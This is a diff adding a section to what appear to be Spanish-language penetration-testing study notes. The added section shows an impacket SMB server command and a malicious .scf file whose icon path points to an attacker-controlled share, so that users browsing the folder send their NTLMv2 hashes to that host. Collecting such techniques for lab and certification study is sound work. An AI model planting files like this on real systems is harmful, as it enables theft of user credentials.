@@ -2119,6 +2119,18 @@ copy \\192.168.230.128\smbfolder\oscp.exe .
 
 > https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
 
+## .SCF
+
+Permite que cuando se cargue el icono se autentique y nos mande el hash ntlm v2 del usuario que intenta ver esa carpeta
+
+```
+# impacket-smbserver  -smb2support  smbFolder $(pwd) 
+[Shell]
+Command=2
+
+IconFile=\\10.10.14.21\smbfolder\icon
+```
+
 
 ## Recon basico windows
 
